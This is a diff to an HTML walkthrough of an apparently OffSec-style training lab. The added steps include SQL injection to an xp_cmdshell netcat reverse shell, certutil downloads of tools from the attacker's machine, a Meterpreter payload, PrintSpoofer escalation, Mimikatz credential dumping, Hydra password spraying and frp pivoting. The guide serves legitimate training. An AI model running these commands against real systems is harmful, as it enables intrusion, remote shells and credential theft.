@@ -593,7 +593,7 @@
           <tbody>
             <tr><td class="mono-cell">192.168.247.120</td><td>WEB01</td><td class="mono-cell">22, 80</td><td>Linux web server</td></tr>
             <tr><td class="mono-cell">192.168.247.121</td><td>WEB02</td><td class="mono-cell">80,135,139,445,5985</td><td>Windows web (IIS + MSSQL)</td></tr>
-            <tr><td class="mono-cell">192.168.247.122</td><td>VPN</td><td class="mono-cell">22</td><td>Linux jump/VPN box</td></tr>
+            <tr><td class="mono-cell">192.168.247.122</td><td>VPN</td><td class="mono-cell">22, 1194</td><td>Linux jump/VPN box</td></tr>
             <tr><td class="mono-cell">172.16.247.10</td><td>DC01</td><td class="mono-cell">53,88,135,139,445,5985</td><td>Domain Controller</td></tr>
             <tr><td class="mono-cell">172.16.247.11</td><td>FILES02</td><td class="mono-cell">135,445,5985</td><td>File server</td></tr>
             <tr><td class="mono-cell">172.16.247.12</td><td>DEV04</td><td class="mono-cell">139,445,3389,5985</td><td>Dev workstation</td></tr>
@@ -621,6 +621,28 @@
           <div class="toolcard"><div class="tname">hashcat</div><div class="tdesc">Cracks stolen password hashes back into plaintext, offline.</div></div>
           <div class="toolcard"><div class="tname">Ligolo-ng</div><div class="tdesc">Tunnels your machine's traffic into a network you've only got one foothold in.</div></div>
         </div>
+      </details>
+
+      <details class="disclosure">
+        <summary>Tool setup reference — where every binary in this lab actually comes from</summary>
+        <table>
+          <thead><tr><th>Tool</th><th>Already on Kali?</th><th>If not, get it from</th></tr></thead>
+          <tbody>
+            <tr><td>rustscan, sqlmap, hydra, hashcat, xfreerdp, msfvenom</td><td class="mono-cell">Yes</td><td>Preinstalled on Kali/Parrot. If missing: <code class="inline">sudo apt install &lt;name&gt;</code></td></tr>
+            <tr><td>nc.exe (Windows netcat)</td><td class="mono-cell">Usually</td><td>Kali ships one at <code class="inline">/usr/share/windows-resources/binaries/nc.exe</code>. If not present: GitHub <code class="inline">int0x33/nc.exe</code> or <code class="inline">eternallybored/netcat-win32</code> releases.</td></tr>
+            <tr><td>Mimikatz</td><td class="mono-cell">No</td><td>GitHub <strong>gentilkiwi/mimikatz</strong> → Releases → grab the latest zip, use <code class="inline">mimikatz.exe</code> (x64).</td></tr>
+            <tr><td>WinPEAS</td><td class="mono-cell">No</td><td>GitHub <strong>carlospolop/PEASS-ng</strong> → Releases → <code class="inline">winPEASx64.exe</code>.</td></tr>
+            <tr><td>PrintSpoofer</td><td class="mono-cell">No</td><td>GitHub <strong>itm4n/PrintSpoofer</strong> → Releases → <code class="inline">PrintSpoofer64.exe</code>.</td></tr>
+            <tr><td>JuicyPotato</td><td class="mono-cell">No</td><td>GitHub <strong>ohpe/juicy-potato</strong> → Releases → <code class="inline">JuicyPotato.exe</code>.</td></tr>
+            <tr><td>Ligolo-ng</td><td class="mono-cell">No</td><td>GitHub <strong>nicocha30/ligolo-ng</strong> → Releases → separate <code class="inline">proxy</code> (Kali/Linux) and <code class="inline">agent</code> (Windows/Linux) binaries per OS/architecture.</td></tr>
+            <tr><td>NetExec (nxc)</td><td class="mono-cell">Maybe</td><td><code class="inline">pipx install netexec</code> if the <code class="inline">nxc</code> command isn't found.</td></tr>
+            <tr><td>Evil-WinRM</td><td class="mono-cell">Usually</td><td><code class="inline">gem install evil-winrm</code> if missing.</td></tr>
+            <tr><td>psexec.py</td><td class="mono-cell">Yes</td><td>Part of Impacket, preinstalled on Kali. If your system names it differently, try <code class="inline">impacket-psexec</code> instead of <code class="inline">psexec.py</code>.</td></tr>
+            <tr><td>BloodHound / bloodhound-python</td><td class="mono-cell">Maybe</td><td><code class="inline">pip install bloodhound</code> for the Python collector; the BloodHound GUI app itself is a separate download from <strong>SpecterOps/BloodHound</strong> on GitHub.</td></tr>
+            <tr><td>rockyou.txt wordlist</td><td class="mono-cell">Yes, but zipped</td><td>Ships compressed at <code class="inline">/usr/share/wordlists/rockyou.txt.gz</code> on a fresh Kali install — extract it once with <code class="inline">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code> before your first <code class="inline">hydra</code>/<code class="inline">hashcat</code> run, or those commands will fail with "file not found."</td></tr>
+          </tbody>
+        </table>
+        <p class="dim" style="padding:0 16px 16px; margin:0;">General pattern for anything not preinstalled: download the release binary to Kali, then use the same serve-and-fetch trick (<code class="inline">python3 -m http.server</code> + <code class="inline">certutil -urlcache -f</code>, or Evil-WinRM's <code class="inline">upload</code>) to get it onto the target — covered in full the first time it comes up, in the WEB02 section below.</p>
       </details>
     </section>
 
@@ -721,6 +743,18 @@
         </ul>
         <p>This confirms the backend is <strong>MSSQL</strong>.</p>
 
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>A path worth trying first: capturing a hash via xp_dirtree + Responder<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p>Before reaching for <code class="inline">xp_cmdshell</code>, it's common to first try something quieter: MSSQL's <code class="inline">xp_dirtree</code> procedure can be pointed at a UNC path (a Windows network share address), which makes the SQL Server itself try to authenticate to that share — sending its credentials (as an NTLM hash) over the network to whatever's listening there.</p>
+            <p>Start <strong>Responder</strong> on Kali to catch that authentication attempt:</p>
+            <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>sudo responder -I tun0</pre></div>
+            <p>Then inject a UNC path pointing back at your own IP:</p>
+            <div class="codebox"><div class="cb-head"><span>sql</span><button class="copy-btn">Copy</button></div><pre>123';exec master..xp_dirtree '\\192.168.45.155\test';--</pre></div>
+            <p>Responder logs an NTLM hash for the MSSQL service account. From here you'd try cracking it offline with <code class="inline">hashcat</code> — but this hash doesn't always crack (strong service-account passwords are common), and when it doesn't, that's fine: it just means this path is a dead end for now, and you fall back to enabling <code class="inline">xp_cmdshell</code> below for direct code execution instead. Worth trying first regardless, since it's non-destructive and sometimes hands you a plaintext password for free.</p>
+          </div>
+        </div>
+
         <h4 class="step">Step 3 — Turn the injection into code execution</h4>
         <div class="callout why">
           <div class="co-head"><span class="icon">?</span>Why go from "read the database" to "run OS commands"?<span class="chev">▾</span></div>
@@ -767,12 +801,22 @@ WriteToStream ($Output)}$StreamWriter.Close()"</pre></div>
             <div class="codebox"><div class="cb-head"><span>bash — on Kali</span><button class="copy-btn">Copy</button></div><pre>python3 -m http.server 8000</pre></div>
             <div class="codebox"><div class="cb-head"><span>cmd — on target</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://&lt;your-kali-ip&gt;:8000/&lt;filename&gt; C:\windows\temp\&lt;filename&gt;</pre></div>
             <p><code class="inline">certutil</code> is a legitimate, built-in Windows certificate tool repurposed to fetch a URL. Every later "upload" step reuses this exact pattern.</p>
+            <p><strong>Where does the <code class="inline">nc.exe</code> you're serving actually come from?</strong> Kali usually ships a Windows netcat binary at <code class="inline">/usr/share/windows-resources/binaries/nc.exe</code> — check there first. If it's not present on your install, grab a compiled one from GitHub (<code class="inline">int0x33/nc.exe</code> is a common source). See the Tool Setup Reference table in §0 for this and every other non-preinstalled tool used later in the lab.</p>
           </div>
         </div>
         <div class="codebox"><div class="cb-head"><span>sql</span><button class="copy-btn">Copy</button></div>
           <pre>EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.249:8000/nc.exe C:\windows\temp\nc.exe';
 EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.249 9005 -e cmd.exe';--</pre></div>
         <p>Either way, you land a shell as the SQL service account — <strong>not</strong> an administrator yet.</p>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why stabilize the foothold before escalating?<span class="chev">▾</span></div>
+          <div class="co-body"><p>A raw netcat shell dies the moment the connection drops — no Ctrl+C handling, no tab completion, easy to lose entirely if a command hangs. Before spending effort on privesc, it's worth upgrading to a more durable implant so a hiccup doesn't cost you the whole foothold. <code class="inline">tsh</code> is one lightweight option for this — a small agent binary that gives you a steadier, more resilient shell than raw netcat.</p></div>
+        </div>
+        <p>Transfer and run it the same way as everything else so far (serve it from Kali, fetch it with <code class="inline">certutil</code>):</p>
+        <div class="codebox"><div class="cb-head"><span>cmd — target</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://192.168.45.223:8000/tsh.exe C:\windows\temp\tsh.exe
+C:\windows\temp\tsh.exe</pre></div>
+        <p class="dim">This step is optional — everything from here on works fine directly from the raw netcat shell too. Treat it as a "nice to have" for a steadier session, not a requirement.</p>
 
         <hr class="rule">
         <h3>Local Privilege Escalation → SYSTEM</h3>
@@ -782,18 +826,66 @@ EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.249 9005 -e cmd.exe';--</pre
         </div>
         <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>whoami /priv</pre></div>
         <p>Look for <code class="inline">SeImpersonatePrivilege</code> — state <code class="inline">Enabled</code>.</p>
+        <p class="dim">That single command is enough here since you already know exactly what you're looking for. If you'd rather not rely on already knowing the answer, running <strong>WinPEAS</strong> instead checks for this alongside dozens of other possible misconfigurations at once — the same tool you'll lean on more heavily later, where the right privesc path isn't already this obvious.</p>
 
         <div class="callout concept">
           <div class="co-head"><span class="icon">i</span>Potato exploits, explained<span class="chev">▾</span></div>
-          <div class="co-body"><p>Service accounts often hold <code class="inline">SeImpersonatePrivilege</code> so they can legitimately impersonate a connecting client. "Potato" exploits (RottenPotato → JuicyPotato → PrintSpoofer → newer variants) trick a SYSTEM-level service into authenticating to a small attacker-controlled listener, then steal and reuse that SYSTEM token. Rule of thumb: privilege Enabled ⇒ a Potato variant is almost always instant SYSTEM.</p></div>
+          <div class="co-body">
+            <p>Service accounts often hold <code class="inline">SeImpersonatePrivilege</code> so they can legitimately impersonate a connecting client. "Potato" exploits (RottenPotato → JuicyPotato → PrintSpoofer → newer variants) trick a SYSTEM-level service into authenticating to a small attacker-controlled listener, then steal and reuse that SYSTEM token. Rule of thumb: privilege Enabled ⇒ a Potato variant is almost always instant SYSTEM.</p>
+            <p><strong>Where PrintSpoofer fits in:</strong> it isn't literally a "Potato" tool by name or code lineage — it's a separate project by a different author. It earns the same nickname informally because it goes after the exact same target (<code class="inline">SeImpersonatePrivilege</code>) to reach the exact same outcome (steal SYSTEM's token). The difference is only in <em>how</em> it tricks a SYSTEM process into connecting to you: classic Potato variants abuse a COM/DCOM + NTLM-relay trick, while PrintSpoofer instead abuses the Print Spooler service's named-pipe behavior (hence the name) to get SYSTEM to connect to a pipe you control. Same category of bug, different mechanical trick — which is also why if one fails, trying the other is worth it: they can succeed or fail independently depending on which specific service is present/patched on the box.</p>
+          </div>
         </div>
 
         <div class="callout why">
           <div class="co-head"><span class="icon">?</span>Why PrintSpoofer specifically?<span class="chev">▾</span></div>
-          <div class="co-body"><p>You just confirmed the exact precondition Potato exploits need. PrintSpoofer works on most modern, patched builds — try it first; JuicyPotato is the fallback for older systems.</p></div>
+          <div class="co-body"><p>You just confirmed the exact precondition Potato-family exploits need. PrintSpoofer works on most modern, patched builds — try it first; JuicyPotato is the fallback for older systems.</p></div>
         </div>
-        <p>Transfer <code class="inline">PrintSpoofer64.exe</code> using the file-transfer pattern above, then run it:</p>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Where do I actually get PrintSpoofer64.exe?<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p>It's a public tool: <strong>itm4n/PrintSpoofer</strong> on GitHub. You don't compile it yourself unless you want to — the repo's <strong>Releases</strong> page has ready-to-run compiled binaries.</p>
+            <ol>
+              <li>On Kali, grab the release binary onto your machine first (browser download, or <code class="inline">wget</code> the raw release asset URL from the repo's Releases page).</li>
+              <li>Serve it and fetch it onto the target using the exact same file-transfer pattern from earlier in this walkthrough:</li>
+            </ol>
+            <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>python3 -m http.server 8000</pre></div>
+            <div class="codebox"><div class="cb-head"><span>cmd — target</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://&lt;your-kali-ip&gt;:8000/PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe</pre></div>
+            <p class="dim">JuicyPotato and most other privesc tools you'll use later (WinPEAS, Mimikatz) come from public GitHub repos the same way — download the release once, then reuse this same serve-and-fetch pattern every time.</p>
+          </div>
+        </div>
+
+        <p>Then run it from wherever you saved it on the target — the simplest version, run directly inside your existing netcat session:</p>
         <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>PrintSpoofer64.exe -i -c cmd</pre></div>
+        <p class="dim">Because you're already sitting inside a live, interactive netcat session, PrintSpoofer's <code class="inline">-i</code> flag pipes the new SYSTEM <code class="inline">cmd.exe</code>'s input/output straight back through that same connection — you'll just see a SYSTEM prompt appear in the window you're already typing into. No new listener needed for this version.</p>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why would you want anything more than that?<span class="chev">▾</span></div>
+          <div class="co-body"><p>A raw <code class="inline">cmd.exe</code> works, but it's limited — no file upload/download built in, no easy in-memory Mimikatz, and if the netcat connection drops you lose SYSTEM entirely and have to redo PrintSpoofer. A <strong>Meterpreter</strong> session instead gives you a proper post-exploitation toolkit (built-in <code class="inline">hashdump</code>, a Mimikatz extension, file transfer commands, session persistence) on top of the same SYSTEM access. Many walkthroughs of this exact lab use this route instead of the plain cmd shell — worth knowing both.</p></div>
+        </div>
+
+        <div class="callout concept">
+          <div class="co-head"><span class="icon">i</span>Getting a Meterpreter SYSTEM session via PrintSpoofer<span class="chev">▾</span></div>
+          <div class="co-body">
+            <p>This is a separate generate → transfer → listen → execute loop, distinct from the shell you already have. You're not reusing the netcat connection this time — PrintSpoofer will launch a brand-new payload that opens its own connection back to a brand-new listener.</p>
+            <p><strong>1. Generate a SYSTEM-bound Meterpreter payload on Kali</strong> (a different file from the <code class="inline">nc.exe</code> you used earlier):</p>
+            <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f exe -o shell.exe</pre></div>
+            <p><strong>2. Set up the matching listener in <code class="inline">msfconsole</code></strong> — this replaces your <code class="inline">nc -lvnp</code> listener for this step, since a Meterpreter payload needs Metasploit's handler on the other end, not plain netcat:</p>
+            <div class="codebox"><div class="cb-head"><span>msfconsole</span><button class="copy-btn">Copy</button></div><pre>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.45.223
+set LPORT 4444
+run</pre></div>
+            <p><strong>3. Transfer both files to the target</strong> — you already have PrintSpoofer64.exe there from the step above; now also serve and fetch <code class="inline">shell.exe</code> using the exact same pattern (from your existing low-privileged netcat session, since you don't need SYSTEM yet to just download a file):</p>
+            <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>python3 -m http.server 8000</pre></div>
+            <div class="codebox"><div class="cb-head"><span>cmd — target, in your existing shell</span><button class="copy-btn">Copy</button></div><pre>certutil -urlcache -f http://192.168.45.223:8000/shell.exe C:\windows\temp\shell.exe</pre></div>
+            <p><strong>4. Run PrintSpoofer, but point <code class="inline">-c</code> at the new payload instead of <code class="inline">cmd</code>:</strong></p>
+            <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>PrintSpoofer64.exe -c "C:\windows\temp\shell.exe"</pre></div>
+            <p>PrintSpoofer still does exactly the same trick as before (steal SYSTEM's token), but this time it uses that token to launch <code class="inline">shell.exe</code> instead of <code class="inline">cmd.exe</code>. Your Meterpreter payload runs as SYSTEM, dials back out to the <code class="inline">msfconsole</code> handler you set up in step 2, and you land a full Meterpreter session — check with <code class="inline">getuid</code>, which should report <code class="inline">NT AUTHORITY\SYSTEM</code>.</p>
+          </div>
+        </div>
+
+        <p>Either way you got there, read the flag:</p>
         <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>type C:\Users\Administrator\Desktop\proof.txt</pre></div>
         <div class="flag">🏁 proof.txt captured</div>
 
@@ -807,7 +899,12 @@ EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.249 9005 -e cmd.exe';--</pre
           <div class="co-head"><span class="icon">i</span>Mimikatz, explained<span class="chev">▾</span></div>
           <div class="co-body"><p>Windows caches credentials in the LSASS process's memory. Mimikatz reads LSASS and extracts plaintext passwords (if conditions allow), NTLM hashes, and Kerberos tickets. Needs SYSTEM/Admin — exactly what you have now.</p></div>
         </div>
-        <p>Transfer <code class="inline">mimikatz.exe</code>, then run interactively:</p>
+        <p class="dim">If you took the Meterpreter route above instead of the plain cmd shell, you can skip transferring <code class="inline">mimikatz.exe</code> separately — Meterpreter has it built in via the <code class="inline">kiwi</code> extension:</p>
+        <div class="codebox"><div class="cb-head"><span>meterpreter</span><button class="copy-btn">Copy</button></div><pre>load kiwi
+creds_all</pre></div>
+        <p class="dim">Same underlying tool, same output — just no manual upload step. The rest of this section assumes the plain cmd-shell route, uploading Mimikatz yourself:</p>
+
+        <p>Transfer <code class="inline">mimikatz.exe</code> using the same file-transfer pattern (get the binary from GitHub's <strong>gentilkiwi/mimikatz</strong> Releases if you don't have it yet — see the Tool Setup Reference in §0), then run it interactively:</p>
         <div class="codebox"><div class="cb-head"><span>mimikatz</span><button class="copy-btn">Copy</button></div>
           <pre>mimikatz.exe
 mimikatz # privilege::debug
@@ -843,20 +940,33 @@ mimikatz # sekurlsa::logonPasswords</pre></div>
 
         <div class="callout why">
           <div class="co-head"><span class="icon">?</span>Why turn to the VPN host now?<span class="chev">▾</span></div>
-          <div class="co-body"><p>It's the other external box you haven't cracked, and its role name ("VPN") plus the netstat clue on WEB02 both suggest it may bridge external and internal networks. That naming/role hint is worth chasing as a pivot candidate.</p></div>
+          <div class="co-body"><p>It's the other external box you haven't cracked, and its role name ("VPN") plus the netstat clue on WEB02 both suggest it may bridge external and internal networks. Port 1194 confirms it further — that's OpenVPN's default service port, so this box is quite literally running a VPN server. Worth remembering: it hints at exactly which <code class="inline">sudo</code> right will turn out to matter once you're in.</p></div>
         </div>
 
         <h4 class="step">Step 1 — Brute-force SSH</h4>
+        <p class="dim">On a fresh Kali install, <code class="inline">rockyou.txt</code> ships compressed and this command will fail with "no such file" until you extract it once: <code class="inline">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>.</p>
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why target both .120 and .122 with the same hydra run?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Both external Linux hosts have SSH open, and you already have one candidate username (<code class="inline">offsec</code>, seen earlier as a non-domain account). Rather than brute-forcing them one at a time, put both IPs in a target file and spray the same username/wordlist combination against both in a single run — it costs nothing extra and you find out about both hosts at once.</p></div>
+        </div>
         <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
-          <pre>hydra -l offsec -P /usr/share/wordlists/rockyou.txt -f 192.168.247.122 ssh</pre></div>
+          <pre>echo -e "192.168.247.120\n192.168.247.122" > ip.txt
+hydra -l offsec -P /usr/share/wordlists/rockyou.txt -M ip.txt ssh</pre></div>
         <ul>
           <li><code class="inline">-l offsec</code> — a single known username</li>
           <li><code class="inline">-P &lt;wordlist&gt;</code> — try every password in this file</li>
-          <li><code class="inline">-f</code> — stop after the first success</li>
+          <li><code class="inline">-M ip.txt</code> — run the same attack against every IP listed in this file, instead of just one target</li>
         </ul>
-        <p>Result: <code class="inline">offsec : password</code>.</p>
+        <p>Only <strong>.122</strong> cracks this way — <code class="inline">offsec : password</code>. .120 doesn't fall to this wordlist; its real credential turns out to be something else entirely, and you won't find it until much later (via loot on the Domain Controller). That's fine — not every host cracks on the first technique you throw at it, and a locked door now doesn't mean it stays locked forever.</p>
         <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>ssh offsec@192.168.247.122</pre></div>
         <div class="flag">🏁 local.txt captured</div>
+
+        <div class="callout why">
+          <div class="co-head"><span class="icon">?</span>Why check shell history here?<span class="chev">▾</span></div>
+          <div class="co-body"><p>Before jumping straight to enumerating <code class="inline">sudo</code> rights, it's worth a quick look at what commands were run on this account before you ever logged in — other testers, admins, or setup scripts often leave a trail. It costs one command and sometimes hands you the exact exploit syntax instead of making you look it up:</p>
+          <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div><pre>history
+cat ~/.bash_history</pre></div></div>
+        </div>
 
         <h4 class="step">Step 2 — Privilege escalation via sudo misconfiguration</h4>
         <div class="callout why">
@@ -927,6 +1037,7 @@ mimikatz # sekurlsa::logonPasswords</pre></div>
 
       <h3>Ligolo-ng, properly explained</h3>
       <p>A modern pivoting tool with two pieces: <strong>proxy</strong> (runs on Kali) and <strong>agent</strong> (a small binary dropped on the compromised host). Once the agent connects, Ligolo-ng creates a virtual interface on Kali and you add a route to it — from then on, Kali talks to the internal network directly.</p>
+      <p class="dim">Get both pieces from GitHub's <strong>nicocha30/ligolo-ng</strong> Releases page — download the <code class="inline">proxy</code> binary built for your Kali architecture, and the <code class="inline">agent</code> binary built for the target's OS (Windows in this lab). They're separate downloads, not one combined package.</p>
       <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div>
         <pre>sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
@@ -941,8 +1052,36 @@ start</pre></div>
         <div class="co-body"><p>Nothing in Phase 3 works without a route into <code class="inline">172.16.247.0/24</code> first. Get the tunnel up before trying anything internal, and re-check <code class="inline">ip route</code> if a tool suddenly can't reach a host it should.</p></div>
       </div>
 
+      <h3>The older alternative: frp + proxychains</h3>
+      <p>Ligolo-ng is the modern choice, but you'll see plenty of walkthroughs of this exact lab pivot a different way, with <strong>frp</strong> (Fast Reverse Proxy) tunneling a SOCKS5 proxy back to Kali, and <strong>proxychains</strong> routing individual commands through it. Worth recognizing both, since older engagements and other people's writeups use this pair constantly.</p>
+      <p>On the compromised WEB02/VPN host, run the frp client:</p>
+      <div class="codebox"><div class="cb-head"><span>cmd/bash — target</span><button class="copy-btn">Copy</button></div><pre>frpc.exe -c frpc.ini</pre></div>
+      <p><code class="inline">frpc.ini</code> — points the client back at your Kali box and opens a SOCKS5 proxy on it:</p>
+      <div class="codebox"><div class="cb-head"><span>ini — frpc.ini</span><button class="copy-btn">Copy</button></div><pre>[common]
+server_addr = 192.168.45.223
+server_port = 7000
+
+[socks5]
+type = tcp
+plugin = socks5
+remote_port = 6000</pre></div>
+      <p>On Kali, run the matching frp server:</p>
+      <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>frps -c frps.ini</pre></div>
+      <div class="codebox"><div class="cb-head"><span>ini — frps.ini</span><button class="copy-btn">Copy</button></div><pre>[common]
+bind_port = 7000</pre></div>
+      <p>Then point <code class="inline">proxychains</code> at the SOCKS5 port frp just opened, by adding a line to its config:</p>
+      <div class="codebox"><div class="cb-head"><span>bash — Kali, edit /etc/proxychains4.conf</span><button class="copy-btn">Copy</button></div><pre>socks5 192.168.45.223 6000</pre></div>
+      <p>From here, prefix any command with <code class="inline">proxychains</code> to route it through the tunnel — for example, scanning the internal range:</p>
+      <div class="codebox"><div class="cb-head"><span>bash — Kali</span><button class="copy-btn">Copy</button></div><pre>proxychains nmap 172.16.247.10-14 -sS -p 1-10000</pre></div>
+
+      <div class="callout why">
+        <div class="co-head"><span class="icon">?</span>So which one should you actually use — Ligolo-ng or frp?<span class="chev">▾</span></div>
+        <div class="co-body"><p>Either works for this lab. Ligolo-ng is generally nicer day-to-day (one real network route, no <code class="inline">proxychains</code> prefix needed on every single command), but frp+proxychains is older, extremely widely documented, and worth being comfortable with since you'll run into it in other people's notes and older material constantly. Pick one, but recognize both.</p></div>
+      </div>
+
       <h3>BloodHound, properly explained <span style="color:var(--text-faint); font-family:var(--sans); font-weight:400; font-size:14px;">(bonus — not strictly required here)</span></h3>
       <p>Once inside AD with any valid domain credential, the next question is always: <strong>what's the shortest path to Domain Admin?</strong> BloodHound collects users, groups, computers, sessions, and ACLs, and renders them as a graph you can query visually.</p>
+      <p class="dim">The Python collector used below installs with <code class="inline">pip install bloodhound</code>. The BloodHound GUI itself (which reads what the collector produces) is a separate download — GitHub's <strong>SpecterOps/BloodHound</strong> Releases — and needs a Neo4j database running locally to import into.</p>
       <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
         <pre>bloodhound-python -u joe -p 'Flowers1' -d medtech.local -ns 172.16.247.10 -c All</pre></div>
       <p class="dim">Mark held credentials as "owned," then run "Find Shortest Paths to Domain Admins" — BloodHound highlights the exact chain to follow.</p>
@@ -1040,7 +1179,7 @@ evil-winrm -i 172.16.247.83 -u wario -p 'Mushroom!'</pre></div>
           <div class="co-head"><span class="icon">?</span>Why run WinPEAS instead of checking manually?<span class="chev">▾</span></div>
           <div class="co-body"><p>Dozens of possible misconfigurations exist — checking each by hand is slow. WinPEAS automates the checklist so you spend time acting on findings, not hunting for them.</p></div>
         </div>
-        <p>Evil-WinRM ships a built-in <code class="inline">upload</code> command — easier than the certutil trick:</p>
+        <p>Get <code class="inline">winPEASx64.exe</code> from GitHub's <strong>carlospolop/PEASS-ng</strong> Releases if you don't already have it (see the Tool Setup Reference in §0). Evil-WinRM ships a built-in <code class="inline">upload</code> command — easier than the certutil trick:</p>
         <div class="codebox"><div class="cb-head"><span>evil-winrm</span><button class="copy-btn">Copy</button></div><pre>upload /path/on/kali/winPEASx64.exe C:\Users\wario\winPEASx64.exe</pre></div>
         <div class="codebox"><div class="cb-head"><span>cmd</span><button class="copy-btn">Copy</button></div><pre>.\winPEASx64.exe</pre></div>
         <p>Flags <code class="inline">auditTracker.exe</code> — the executable behind a running service — as writable by "Everyone."</p>
@@ -1097,8 +1236,10 @@ sc.exe start auditTracker</pre></div>
           <div class="co-body"><p>No reason to think yoshi's password is limited to one host — same spraying logic. This time RDP is open instead of SMB/WinRM, so the login method changes, but the reuse logic doesn't.</p></div>
         </div>
         <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
-          <pre>nxc rdp 172.16.247.12 -u yoshi -p 'Mushroom!'
-xfreerdp /u:yoshi /p:'Mushroom!' /v:172.16.247.12</pre></div>
+          <pre>nxc rdp 172.16.247.12 -u yoshi -p 'Mushroom!'</pre></div>
+        <p class="dim">Connect with an RDP client. <code class="inline">xfreerdp</code> is used throughout this walkthrough and works reliably against this target. If you instead reach for <code class="inline">rdesktop</code> (another common RDP client) and it refuses to connect or throws a protocol/negotiation error, that's a known compatibility gap — rdesktop's RDP implementation is older and doesn't always handle modern Windows Server security layers cleanly. Don't spend time debugging it: switch to <code class="inline">xfreerdp</code> or the GUI client <strong>Remmina</strong> (already installed on Kali) and move on.</p>
+        <div class="codebox"><div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+          <pre>xfreerdp /u:yoshi /p:'Mushroom!' /v:172.16.247.12</pre></div>
         <div class="flag">🏁 local.txt captured</div>
 
         <h4 class="step">Privilege escalation: scheduled task hijack</h4>
